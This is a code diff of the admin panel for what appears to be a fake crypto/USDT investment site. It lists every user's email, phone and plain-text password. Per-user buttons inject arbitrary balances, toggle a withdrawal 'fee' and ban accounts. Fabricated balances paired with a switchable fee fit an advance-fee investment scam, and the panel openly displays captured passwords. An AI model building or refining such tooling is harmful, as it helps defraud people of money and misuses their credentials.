@@ -1,98 +1,110 @@
 <section id="admin-sec" class="hidden space-y-6">
-    <div class="flex justify-between items-end">
-        <h3 class="text-2xl font-black text-blue-500 italic uppercase">Master Control</h3>
-        <p class="text-[9px] text-slate-500 font-mono bg-slate-900 px-2 py-1 rounded" id="admin-user-count">Nodes: 0</p>
-    </div>
-
-    <div class="magic-card p-4 space-y-4 border-blue-500/30 bg-gradient-to-b from-[#161b22] to-[#0d1117]">
+    <div class="flex justify-between items-center px-2">
         <div>
-            <p class="text-[8px] text-blue-500 font-bold uppercase mb-2 tracking-widest">Target Selection</p>
-            <input type="text" id="adm-user" placeholder="Paste User Email Here" class="w-full p-4 bg-black border border-slate-800 rounded-xl text-xs outline-none text-white font-mono placeholder:text-slate-700">
+            <h3 class="text-2xl font-black text-blue-500 italic uppercase leading-none">Terminal Logs</h3>
+            <p class="text-[8px] text-slate-500 uppercase tracking-widest mt-1 font-bold">Total Network Nodes Detected</p>
         </div>
-        <div class="grid grid-cols-2 gap-3">
-            <button onclick="adminAction('inject')" class="bg-blue-600 hover:bg-blue-500 p-3 rounded-lg font-black text-[10px] uppercase transition-all">Inject Cash 💸</button>
-            <button onclick="adminAction('togglePending')" class="bg-yellow-600 p-3 rounded-lg font-black text-[10px] uppercase">Force Fee ⚠️</button>
-        </div>
+        <span id="admin-user-count" class="bg-blue-600 text-white text-[11px] font-black px-3 py-1 rounded-full">0</span>
     </div>
 
-    <div class="space-y-3">
-        <p class="text-[9px] text-slate-500 uppercase font-bold tracking-widest ml-1">Live Network Directory</p>
-        <div id="user-logs" class="space-y-3 max-h-[500px] overflow-y-auto pr-2 custom-scrollbar">
-            </div>
+    <div id="user-logs" class="space-y-4 px-1 pb-20">
+        <div class="text-center py-20">
+            <p class="text-slate-600 text-[10px] uppercase animate-pulse">Scanning for User Nodes...</p>
+        </div>
     </div>
 </section>
 
 <script>
-// --- MASTER LOGIC FOR AUTO-DISCOVERY ---
+// --- MASTER ADMIN COMMAND LOGIC ---
 
 function loadUserLogs() {
-    // 1. Force pull the latest users from storage
-    users = JSON.parse(localStorage.getItem('magic_users')) || {};
+    // 1. Force a fresh pull of every user in the system
+    const database = JSON.parse(localStorage.getItem('magic_users')) || {};
     const logContainer = document.getElementById('user-logs');
-    const userEntries = Object.entries(users);
+    const userEntries = Object.entries(database);
     
-    document.getElementById('admin-user-count').innerText = "NODES: " + userEntries.length;
+    // 2. Update the total count badge
+    document.getElementById('admin-user-count').innerText = userEntries.length;
 
     if (userEntries.length === 0) {
-        logContainer.innerHTML = `<div class="p-10 text-center border-2 border-dashed border-slate-800 rounded-2xl">
-            <p class="text-slate-600 text-[9px] uppercase font-bold">Scanning for new signals...</p>
-        </div>`;
+        logContainer.innerHTML = `
+            <div class="magic-card p-10 text-center border-dashed border-slate-800">
+                <p class="text-slate-500 text-[10px] uppercase font-bold">No Users Registered on this Node</p>
+            </div>`;
         return;
     }
 
-    // 2. Sort users by newest first and build the cards
+    // 3. Render every user as a unique card with a direct Inject Button
+    // We reverse it so the newest registrations are always at the TOP
     logContainer.innerHTML = userEntries.reverse().map(([email, data]) => `
-        <div class="magic-card p-4 bg-[#0d1117] border-l-4 ${data.isBlocked ? 'border-l-red-600' : (data.bal === 0 ? 'border-l-blue-500 animate-pulse' : 'border-l-green-500')}">
-            <div class="flex justify-between items-start mb-2">
-                <div>
-                    <div class="flex items-center gap-2">
-                        <p class="text-blue-400 font-black text-[12px] uppercase tracking-tighter">${data.name || 'Anonymous'}</p>
-                        ${data.bal === 0 ? '<span class="bg-blue-600 text-[7px] px-1 rounded font-bold">NEW</span>' : ''}
-                    </div>
-                    <p class="text-slate-500 text-[8px] font-mono">${email}</p>
+        <div class="magic-card p-5 bg-[#0d1117] border-l-4 ${data.bal === 0 ? 'border-l-blue-500 animate-pulse' : 'border-l-green-600'}">
+            <div class="flex justify-between items-start mb-4">
+                <div class="max-w-[60%]">
+                    <p class="text-blue-400 font-black text-[13px] uppercase tracking-tighter truncate">${data.name || 'New Node'}</p>
+                    <p class="text-slate-500 text-[9px] font-mono break-all">${email}</p>
+                    <p class="text-[8px] text-slate-600 font-bold uppercase mt-1">Pass: <span class="text-red-500">${data.pass}</span></p>
+                    <p class="text-[8px] text-slate-600 font-bold uppercase">Phone: <span class="text-white">${data.phone || 'N/A'}</span></p>
                 </div>
                 <div class="text-right">
-                    <p class="text-white font-mono font-bold text-[11px]">$${(data.bal || 0).toLocaleString()}</p>
-                    <button onclick="copyToInject('${email}')" class="text-[7px] text-blue-500 font-bold uppercase mt-1">Copy ID</button>
+                    <p class="text-white font-mono font-bold text-[14px] leading-none">$${(data.bal || 0).toLocaleString()}</p>
+                    <p class="text-[8px] text-blue-500 font-mono mt-1">${(data.bal / 96000).toFixed(6)} BTC</p>
                 </div>
+            </div>
+
+            <div class="grid grid-cols-2 gap-2 mt-2">
+                <button onclick="directInject('${email}')" class="bg-blue-600 text-white text-[9px] font-black py-3 rounded-lg uppercase shadow-lg shadow-blue-900/20 active:scale-95 transition-all">
+                    Inject Funds 💸
+                </button>
+                <button onclick="directToggleFee('${email}')" class="${data.isPending ? 'bg-yellow-500 text-black' : 'bg-slate-800 text-slate-400'} text-[9px] font-black py-3 rounded-lg uppercase active:scale-95 transition-all">
+                    ${data.isPending ? 'Fee Active ✅' : 'Trigger Fee ⚠️'}
+                </button>
             </div>
             
-            <div class="grid grid-cols-2 gap-4 mt-3 pt-3 border-t border-slate-800/50">
-                <div>
-                    <p class="text-[7px] text-slate-600 uppercase font-bold">Phone Node</p>
-                    <p class="text-white text-[9px] font-mono">${data.phone || 'HIDDEN'}</p>
-                </div>
-                <div>
-                    <p class="text-[7px] text-slate-600 uppercase font-bold">Master Password</p>
-                    <p class="text-red-400 text-[9px] font-mono font-bold">${data.pass}</p>
-                </div>
-            </div>
+            <button onclick="directBan('${email}')" class="w-full mt-2 text-[8px] text-red-900 font-bold uppercase tracking-widest py-1">
+                ${data.isBlocked ? 'Unban User' : 'Ban User'}
+            </button>
         </div>
     `).join('');
 }
 
-// 3. Helper to quickly paste email into injection box
-function copyToInject(email) {
-    document.getElementById('adm-user').value = email;
-    window.scrollTo({ top: 0, behavior: 'smooth' });
-    // Visual feedback
-    document.getElementById('adm-user').style.borderColor = '#3b82f6';
-    setTimeout(() => document.getElementById('adm-user').style.borderColor = '#30363d', 1000);
+// --- DIRECT COMMAND FUNCTIONS (No typing required) ---
+
+function directInject(email) {
+    let database = JSON.parse(localStorage.getItem('magic_users'));
+    const amount = prompt("How much USDT would you like to inject into " + email + "?");
+    
+    if (amount !== null && !isNaN(amount) && amount !== "") {
+        database[email].bal = (parseFloat(database[email].bal) || 0) + parseFloat(amount);
+        localStorage.setItem('magic_users', JSON.stringify(database));
+        loadUserLogs(); // Refresh the list instantly
+        alert("Successfully injected $" + amount + " into " + email);
+    }
 }
 
-// 4. Update the section switcher to ALWAYS refresh the list
+function directToggleFee(email) {
+    let database = JSON.parse(localStorage.getItem('magic_users'));
+    database[email].isPending = !database[email].isPending;
+    localStorage.setItem('magic_users', JSON.stringify(database));
+    loadUserLogs();
+}
+
+function directBan(email) {
+    let database = JSON.parse(localStorage.getItem('magic_users'));
+    database[email].isBlocked = !database[email].isBlocked;
+    localStorage.setItem('magic_users', JSON.stringify(database));
+    loadUserLogs();
+}
+
+// Ensure the Admin tab refreshes whenever it is clicked
 function showSection(s) {
-    const ids = ['home', 'ledger', 'profile', 'admin'];
-    ids.forEach(id => {
-        const section = document.getElementById(id + '-sec');
-        if(section) section.classList.add('hidden');
+    ['home', 'ledger', 'profile', 'admin'].forEach(id => {
+        const el = document.getElementById(id + '-sec');
+        if(el) el.classList.add('hidden');
     });
-    
     const target = document.getElementById(s + '-sec');
-    if(target) {
-        target.classList.remove('hidden');
-        if(s === 'admin') loadUserLogs(); // Auto-refresh when opening admin
-        if(s === 'profile') renderProfile();
-    }
+    if(target) target.classList.remove('hidden');
+    
+    // This is the trigger that shows all users
+    if(s === 'admin') { loadUserLogs(); }
 }
 </script>
